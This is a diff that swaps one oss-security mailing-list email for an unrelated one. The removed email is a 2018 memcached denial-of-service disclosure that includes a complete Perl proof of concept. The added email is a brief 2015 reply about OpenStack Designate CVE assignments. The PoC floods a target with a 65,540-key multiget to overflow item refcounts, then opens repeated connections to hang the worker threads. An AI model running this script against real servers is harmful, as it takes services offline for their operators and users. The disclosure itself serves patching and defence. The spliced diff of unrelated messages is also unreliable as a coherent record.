@@ -1,9 +1,9 @@
-X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["4998" "Thursday" "8" "March" "2018" "13:15:09" "-0800" "dormando" "dormando@rydia.net" "<alpine.DEB.2.20.1803081246570.25482@di7>" "164" "[oss-security] Re: Memcached remote DoS in older versions" "^Date:" nil nil "3" "2018030821:15:09" "[oss-security] Re: Memcached remote DoS in older versions" (number mark "U       dormando@ryd Mar  8  164/4998  " thread-indent "\"[oss-security] Re: Memcached remote DoS in older versions\"\n") "<alpine.DEB.2.20.1803071743230.20789@di7>" ("<alpine.DEB.2.20.1803071743230.20789@di7>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["1184" "Wednesday" "29" "July" "2015" "14:32:51" "+0100" "Kiall Mac Innes" "kiall@macinnes.ie" "<55B8D603.6070007@macinnes.ie>" "45" "Re: [oss-security] Re: CVE Request - OpenStack Designate mDNS DoS through incorrect handling of large RecordSets" nil nil nil "7" "2015072913:32:51" "[oss-security] Re: CVE Request - OpenStack Designate mDNS DoS through incorrect handling of large RecordSets" (number mark "        kiall@macinn Jul 29   45/1184  " thread-indent "\"Re: [oss-security] Re: CVE Request - OpenStack Designate mDNS DoS through incorrect handling of large RecordSets\"\n") "<20150728210918.BEF2372E041@smtpvbsrv1.mitre.org>" ("<20150728210918.BEF2372E041@smtpvbsrv1.mitre.org>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
-X-Mozilla-Status: 0000
+X-Mozilla-Status: 0001
 X-Mozilla-Status2: 00000000
-Received: (qmail 23610 invoked by uid 550); 8 Mar 2018 21:15:22 -0000
+Received: (qmail 22299 invoked by uid 550); 29 Jul 2015 13:33:09 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,181 +11,69 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Received: (qmail 23574 invoked from network); 8 Mar 2018 21:15:21 -0000
-X-X-Sender: dormando@di7
-In-Reply-To: <alpine.DEB.2.20.1803071743230.20789@di7>
-Message-ID: <alpine.DEB.2.20.1803081246570.25482@di7>
-References: <alpine.DEB.2.20.1803071743230.20789@di7>
-User-Agent: Alpine 2.20 (DEB 67 2015-01-07)
+Received: (qmail 22279 invoked from network); 29 Jul 2015 13:33:08 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=macinnes.ie;
+	s=default; t=1438176773;
+	bh=zwCjrHbf4qvWcMJYrn9NRa/BDBOJIpz6CbHFOL9Rrl0=;
+	h=Date:From:To:Subject:References:In-Reply-To;
+	b=Emhj4/sjXzO/w/8n2NodiCBp4MIdHVESJJeHtDmyZSWdE97wI8339+aa3JRUfyUbR
+	 XQr8Ob1fWHAEdAwuuCxKMeT9Qz1Dtl3SAZL46bykQxxpEn+XfmTjvaozlqb8r6rK+g
+	 M60/aNdiAfO0rMb9Vp5Ysb12/hSju4w7aYmFkj5E=
+Message-ID: <55B8D603.6070007@macinnes.ie>
 MIME-Version: 1.0
-Content-Type: text/plain; charset=US-ASCII
-Date: Thu, 8 Mar 2018 13:15:09 -0800 (PST)
-From: dormando <dormando@rydia.net>
+References: <20150728210918.BEF2372E041@smtpvbsrv1.mitre.org>
+In-Reply-To: <20150728210918.BEF2372E041@smtpvbsrv1.mitre.org>
+Content-Type: text/plain; charset=windows-1252
+Content-Transfer-Encoding: 7bit
+Date: Wed, 29 Jul 2015 14:32:51 +0100
+From: Kiall Mac Innes <kiall@macinnes.ie>
 Reply-To: oss-security@lists.openwall.com
-Subject: [oss-security] Re: Memcached remote DoS in older versions
+Subject: Re: [oss-security] Re: CVE Request - OpenStack Designate mDNS DoS
+ through incorrect handling of large RecordSets
 To: oss-security@lists.openwall.com
 
-> Hello,
->
-> There are a number of hang/crash bugs fixed in older versions of
-> memcached. All are noted in the release notes of the versions containing
-> the respective fixes, and most are years old.
->
-> I'm writing this in case pointing this out can help drive users to close
-> their instances from the internet; aside from participating in DDoS
-> attacks and remote users being able to read any data stored in the
-> instances, they can also be crashed or deadlocked.
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA256
 
-I've requested a CVE.
+On 28/07/15 22:09, cve-assign@mitre.org wrote:
+>>> https://launchpad.net/bugs/1471161
+> 
+>>> Designate does not enforce the DNS protocol limit concerning
+>>> record set sizes
+> 
+>>> As a result, the rendering loop in desginate-mdns can does not
+>>> make progress
+> 
+>>> https://bugs.launchpad.net/designate/+bug/1471161/comments/5
+> 
+>>> 1: Quotas were being bypassed as part of the v1 API.
+> 
+>> two CVE IDs:
+> 
+>> one for the original "does not enforce the DNS protocol limit 
+>> concerning record set sizes" issue
+> 
+> Use CVE-2015-5694.
+> 
+> 
+>> one for the "Quotas were being bypassed" issue.
+> 
+> Use CVE-2015-5695.
+> 
+> 
 
-After further testing, this particular flaw affects versions 1.4.11
-through 1.4.36.
-1.4.11 was released January 16th, 2012.
-1.4.37 (the fix) was released June 4th, 2017.
+Great, Thank you.
 
-The fix came from a user reporting deadlocks in running instances, caused
-by a bug in their application triggering this particular bug.
+Thanks,
+Kiall
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v2
 
-It's highly recommended that users not expose memcached directly to the
-internet, as this may allow malicious users to read contents of memory,
-remote DDoS via the UDP protocol, or crash and hang the instance.
-
-There are also likely other similar issues in even older code.
-
-DESCRIPTION
-===========
-
-In versions 1.4.9-11, the items.c:item_remove() was refactored as part of
-a thread scalability project. The function will free an item back to slab
-memory if the reference count has dropped to zero, *and* the item is no
-longer referenced in the hash table + LRU. In .11, the secondary check for
-ITEM_LINKED bit was not re-added after a bug fix.
-
-An integer overflow bug has existed as long as memcached has, where many
-gets for the same key (> 2^16 in a single multiget or across many slow
-connections) can cause the refcount value to overflow.
-
-After .11, the item will automatically free while still being linked in
-the LRU and hash table. This allows the memory to be reused for a
-different item, while still existing in the hash table + LRU.
-
-Items contain embedded NEXT and PREV links for the LRU. This memory is not
-explicitly cleared when items return to the slab allocator.
-
-If this bug is hit multiple times, it can cause data corruption, loops in
-the LRU, or loops in hash chain buckets where no valid key is found.
-
-IMPACT
-======
-
-Instances with loops in the LRU's and hash chains can cause a worker
-thread to spin CPU while holding various locks (cache_lock in older
-versions, item locks in newer ones). Other worker threads can then hang by
-requesting the same item lock. The daemon then requires a restart to
-become functional again.
-
-I've only tested this against local instances built directly from source.
-It is not known to me if long running instances are vulnerable.
-
-MITIGATION
-==========
-
-Do not expose memcached to untrusted clients. No software mitigations are
-known beyond upgrading.
-
-RESOLUTION
-==========
-
-Versions 1.4.37 and newer prevent trivial refcount overflows. Running the
-latest version with UDP disabled is highly recommended in general.
-
-The specific fix is in:
-https://github.com/memcached/memcached/commit/a8c4a82787b8b6c256d61bd5c42fb7f92d1bae00
-
-If anyone wishes to backport. It is also possible to limit the impact of
-the problem by re-adding the ITEM_LINKED bit check in item_remove().
-
-POC FOLLOWS
-===========
-
-#!/usr/bin/perl
-# It may be necessary to run a "flush_all" for this to work on long running
-# instances.
-
-use warnings;
-use strict;
-
-use IO::Socket::INET;
-
-my $s = IO::Socket::INET->new(PeerAddr => $ARGV[0], Timeout => 4);
-die unless $s;
-
-my $USE_SIZES = 0;
-
-print $s "version\r\n";
-my $r = <$s>;
-if ($r =~ m/^VERSION 1\.5\./) {
-    die "unaffected";
-} elsif ($r =~ m/^VERSION 1\.(\d+)\.(\d+)/) {
-    die "unaffected" if ($1 == 4 && $2 > 36)
-        || ($1 == 4 && $2 < 11)
-        || ($1 < 4);
-    if (($1 == 4 && $2 < 25) ) {
-        print "using 'stats sizes' for < 1.4.25\n";
-        $USE_SIZES = 1;
-    }
-} else {
-    die "Unknown/unaffected";
-}
-
-$SIG{ALRM} = sub { die "dead\n" };
-
-my $get = 'dd ' x 65540;
-chop $get;
-my $count = 0;
-while (1) {
-    eval {
-        print "break\n";
-        alarm 20;
-        print $s "version\r\n";
-        $r = <$s>;
-        print $s "set dd 0 0 2\r\nno\r\n";
-        $r = <$s>;
-        print $s "get $get\r\n";
-        wait_end($s);
-        print $s "get dd\r\n";
-        wait_end($s);
-        if ($USE_SIZES && $count > 10) {
-            # stats sizes infinite loop while holding cache_lock
-            print $s "set foo 0 0 2\r\nok\r\n";
-            $r = <$s>;
-            print $s "stats sizes\r\n";
-            wait_end($s);
-            $count = 0;
-        }
-        alarm 0;
-        $count++;
-    };
-    if ($@ && $@ eq "dead\n") {
-        print "hang\n";
-        eval {
-            alarm 10;
-            # hang other worker threads on stuck item lock
-            for (1..50) {
-                $s = IO::Socket::INET->new(PeerAddr => $ARGV[0], Timeout => 4);
-                print $s "get dd\r\n";
-            }
-        };
-        die "done";
-    } elsif ($@) {
-        die $@;
-    }
-}
-
-sub wait_end {
-    my $s = shift;
-    while (1) {
-        my $r = <$s>;
-        last if $r =~ m/END/;
-    }
-}
+iQEcBAEBCAAGBQJVuNYCAAoJEHuWgzsGpgIasHEIAJlxDqvKFfZTQA0Nuoqr9jPP
++V+oZIjg4bGQTSrFi11Jq8D3fmyoqRCb47E/XC/8VPZkBk/lPJ6BcBiDcOu9flst
+zw1J4qmcbxMeT9hCLmutcSZXI8KTWmpTczI3MN+RrgeDi4D2IEnkv+658b7mrOix
+7JMW56pkOLWLCf5QNDRTWHHTpac6hA0C2svp3Jwv5uMh+UWMcjD4ob6SM0tlG59w
+1ZRpGf/zE3UoabwJADXtNLewyb5CbI2qVUkvco/JeIZdFF0I/I8oRG7yxxotHYkg
+6MvwDVN6cLCvwe28vo/Mm0rvVw9uf4hqVIfYwE3rGCfN4zlTRu0ncPwRuHg865I=
+=S6kC
+-----END PGP SIGNATURE-----
